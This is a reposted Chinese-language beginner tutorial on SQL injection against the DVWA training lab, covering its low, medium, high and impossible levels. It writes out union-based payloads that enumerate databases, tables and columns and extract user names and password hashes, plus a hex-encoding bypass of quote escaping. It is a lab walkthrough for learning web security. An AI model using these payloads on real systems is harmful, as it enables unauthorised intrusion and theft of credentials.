<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>滲透測試新手入門之DVWA（SQL注入）篇 | 极客快訊</title><meta property="og:title" content="滲透測試新手入門之DVWA（SQL注入）篇 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p9.pstatp.com/large/dfic-imagehandler/42f2bc21-8f8b-486b-9d85-a4bfd1106c10"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/3f7c76d.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/3f7c76d.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="滲透測試新手入門之DVWA（SQL注入）篇"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/3f7c76d.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>滲透測試新手入門之DVWA（SQL注入）篇</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><h1 class=pgc-h-arrow-right>一、SQL注入概念</h1><blockquote class=pgc-blockquote-abstract><p>SQL注入是指攻擊者通過注入惡意的SQL命令,破壞SQL查詢語句的結構,從而達到執行惡意SQL語句的目的。</p></blockquote><p><br></p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/dfic-imagehandler/42f2bc21-8f8b-486b-9d85-a4bfd1106c10><p class=pgc-img-caption></p></div><p><br></p><h1 class=pgc-h-arrow-right>二、手工注入常規思路</h1><blockquote class=pgc-blockquote-abstract><p>1.判斷是否存在注入，注入是字符型還是數字型</p><p>2.猜解SQL查詢語句中的字段數</p><p>3.確定回顯位置</p><p>4.獲取當前數據庫</p><p>5.獲取數據庫中的表</p><p>6.獲取表中的字段名</p><p>7.得到數據</p></blockquote><p><strong>將DVWA的級別設置為low</strong></p><p>1.分析源碼，可以看到沒有對參數做任何的過濾，直接帶入數據庫進行查詢，分析sql查詢語句，可能存在字符型sql注入。</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/237b800fa6134c3596f809938b34f210><p class=pgc-img-caption></p></div><p>2.判斷sql是否存在存入，以及注入的類型</p><p>1' and '1'='1</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/80bc55df44d84b22a71576be17871924><p class=pgc-img-caption></p></div><p>3.猜解SQL查詢語句中的字段數</p><p>3.1 1' order by 2#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/556abdbd62834e829ac1474137e4b318><p class=pgc-img-caption></p></div><p>3.2 1' order by 3#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/5ba73401c6d24ed297d1dc3fe25aa3e1><p class=pgc-img-caption></p></div><p>3.3從上面兩個圖可以說明，SQL語句查詢的表的字段數是2</p><p>4.確定顯示的位置(SQL語句查詢之後的回顯位置)</p><p>1' union select 1,2# #下圖可以看出有2個回顯</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f3c189bcd13a459bac82f6c16b7e88f8><p class=pgc-img-caption></p></div><p>5.查詢當前的數據庫，以及版本</p><p>1' union select version(),database()#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/866768955d60431686144fb459eccbda><p class=pgc-img-caption></p></div><p>6.獲取數據庫中的表</p><p>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f351c9f42aa442e9ac237dfef7cd2c9f><p class=pgc-img-caption></p></div><p>7.獲取表中的字段名</p><p>1' union select 1, group_concat(column_name) from information_schema.columns where table_name='users'#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/2db7b21920f94c48bc9281d35c42eae7><p class=pgc-img-caption></p></div><p>8.獲得字段中的數據</p><p>1' union select user,password from users#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/ffcfad66459c4b9c9df991d281cedb1a><p class=pgc-img-caption></p></div><p><strong>將DVWA的級別設置為Medium</strong></p><p>1.下圖可以看到中級加入了一些防禦，不讓用戶輸入,只提供選擇(可以用burpsuit抓包來繞過)，分析源碼可以看到對參數使用mysql_real_escape_string函數轉義sql語句中的一些特殊字符，查看sql查詢語句可以看出可能存在數字型sql注入</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/3253e3c09b6746508323d9770bde1f1a><p class=pgc-img-caption></p></div><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/42689094dec4423b859859e881f83528><p class=pgc-img-caption></p></div><p>2.通過burpsuit抓包，修改數據包，繞過防禦</p><p>2.1判斷注入點，以及注入的類型，下圖可以看到，存在注入，注入類型是數字型注入</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/a09f8e187937486dab34426a2e7bfc8a><p class=pgc-img-caption></p></div><p>2.2猜解sql查詢語句中的字段的個數，下圖說明字段的個數為2</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0c6c7073c13743ee929c026fd74afa5e><p class=pgc-img-caption></p></div><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/cb1d6a2bc4344b26aada8a843717cc6d><p class=pgc-img-caption></p></div><p>2.3.確定回顯的位置,下圖可以說明有2個回顯位置</p><p>1 union select 1,2#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/20e396b483ff48488c3cf8ae6601f2e5><p class=pgc-img-caption></p></div><p>2.4.獲取當前數據庫的名稱以及版本</p><p>1 union select database(),version()#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/5ba668097b8346d89d63065e7eac5fda><p class=pgc-img-caption></p></div><p>2.5獲取數據庫中的所有表</p><p>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9c56be94acc141faa19b7db51506b559><p class=pgc-img-caption></p></div><p>2.6獲取表中的所有字段名</p><p>考慮到單引號被轉義，可以利用 16 進制進行繞過</p><p>union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/3e147a936bf642488deb41dc915cfd5f><p class=pgc-img-caption></p></div><p>2.7獲取字段中的數據</p><p>1 union select user,password from users#</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/22977d6479d64136900f7b4d079740c7><p class=pgc-img-caption></p></div><p><strong>將DVWA的級別設置為High</strong></p><p>1.將dvwa設置為高級，可以看出，點擊”here to change your ID”，頁面自動跳轉，防禦了自動化的SQL注入，分析源碼可以看到，對參數沒有做防禦，在sql查詢語句中限制了查詢條數，可以通過burpsuit抓包，修改數據包實現繞過</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/d4a9b593f9664272bfe3bbc5f70fa4d4><p class=pgc-img-caption></p></div><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/ee74587bf65c461e91218612f432c7dd><p class=pgc-img-caption></p></div><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/8d4054ddb8924edfa5369a87f5294aea><p class=pgc-img-caption></p></div><p>　</p><p>2.2獲得密碼</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/83635aa7a751417cb42345e6098ac8b4><p class=pgc-img-caption></p></div><p><strong>將DVWA的級別設置為Impossible</strong></p><p>1.分析源碼可以看到使用了PDO技術，杜絕了SQL注入</p><p>　　</p><div class=pgc-img><img alt=滲透測試新手入門之DVWA（SQL注入）篇 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/998e648321f04fbb81cb69893dbc6a86><p class=pgc-img-caption></p></div><p><br></p><p>原文地址：https://www.cnblogs.com/yuzly/p/10725942.html</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>滲透</a></li><li><a>測試</a></li><li><a>入門</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/5405551.html alt="滲透測試新手入門之DVWA（Command Injection命令行注入）篇" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/dfic-imagehandler/3938e298-7ce1-4dbd-b232-18a64bb8d918 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/5405551.html title="滲透測試新手入門之DVWA（Command Injection命令行注入）篇">滲透測試新手入門之DVWA（Command Injection命令行注入）篇</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/ca0627f9.html alt=滲透測試——內存攻擊原理 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/ae687b82fd824bafafb7c6792c260a98 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/ca0627f9.html title=滲透測試——內存攻擊原理>滲透測試——內存攻擊原理</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/7d587018.html alt=軟件測試入門（五）之功能測試 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/7d587018.html title=軟件測試入門（五）之功能測試>軟件測試入門（五）之功能測試</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c775069d.html alt=網站滲透測試中溯源技術與授權機制 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/dfed9c4c34b845b3930b95fe128c8b6e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/c775069d.html title=網站滲透測試中溯源技術與授權機制>網站滲透測試中溯源技術與授權機制</a></li><hr><li><a href=../../tw/%E7%A7%91%E5%AD%B8/ea4ff411.html alt=什麼是滲透測試？滲透等於入侵？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E5%AD%B8/ea4ff411.html title=什麼是滲透測試？滲透等於入侵？>什麼是滲透測試？滲透等於入侵？</a></li><hr><li><a href=../../tw/%E9%81%8A%E6%88%B2/413a01ee.html alt=web滲透測試——數據庫攻擊技巧整理 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/6a3ef9576c94494a9a2d55df4d236078 style=border-radius:25px></a>
<a href=../../tw/%E9%81%8A%E6%88%B2/413a01ee.html title=web滲透測試——數據庫攻擊技巧整理>web滲透測試——數據庫攻擊技巧整理</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/80761a97.html alt=web滲透測試——常見運維繫統攻擊技巧整理 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/cad6dc23a7fe40ed83bf515cf4fc1f84 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/80761a97.html title=web滲透測試——常見運維繫統攻擊技巧整理>web滲透測試——常見運維繫統攻擊技巧整理</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/fba9cce.html alt=軟件測試入門竟然這麼簡單（4） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/544c876e27ab4757b34b58a3c6342ff9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/fba9cce.html title=軟件測試入門竟然這麼簡單（4）>軟件測試入門竟然這麼簡單（4）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b6aa17a.html alt=軟件測試入門竟然這麼簡單（3） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/ea8636dd83c641ac89fd8bbb65c2dbdc style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b6aa17a.html title=軟件測試入門竟然這麼簡單（3）>軟件測試入門竟然這麼簡單（3）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/25ef52c.html alt=史上最全的python滲透測試工具合集 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/dfic-imagehandler/2344fc1e-9f41-49a5-a2c7-d9365e0ccd43 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/25ef52c.html title=史上最全的python滲透測試工具合集>史上最全的python滲透測試工具合集</a></li><hr><li><a href=../../tw/%E7%A7%91%E5%AD%B8/6260384.html alt=適用於滲透測試不同階段的工具資源收集整理（武器庫） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=http://p1.pstatp.com/large/pgc-image/15306130677121820c277c9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E5%AD%B8/6260384.html title=適用於滲透測試不同階段的工具資源收集整理（武器庫）>適用於滲透測試不同階段的工具資源收集整理（武器庫）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/6fe27eab.html alt="前端 | HTML入門基礎知識-網頁" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/e7a0b61194f445b8b9e5ae330961d2ea style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/6fe27eab.html title="前端 | HTML入門基礎知識-網頁">前端 | HTML入門基礎知識-網頁</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/6d1c2a0c.html alt=塑料扯斷伸長率的概念及測試要點 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/dfic-imagehandler/6fe0ba07-c929-4046-9216-7f6d5eaa1716 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/6d1c2a0c.html title=塑料扯斷伸長率的概念及測試要點>塑料扯斷伸長率的概念及測試要點</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/ebbbc375.html alt=時間繼電器測試儀的使用方法 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/1205bf787f1f4de6a5f1e73e7737887b style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/ebbbc375.html title=時間繼電器測試儀的使用方法>時間繼電器測試儀的使用方法</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/bee6be40.html alt=河北省邯鄲市計量測試所大力實施專業技能提升行動 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/bee6be40.html title=河北省邯鄲市計量測試所大力實施專業技能提升行動>河北省邯鄲市計量測試所大力實施專業技能提升行動</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>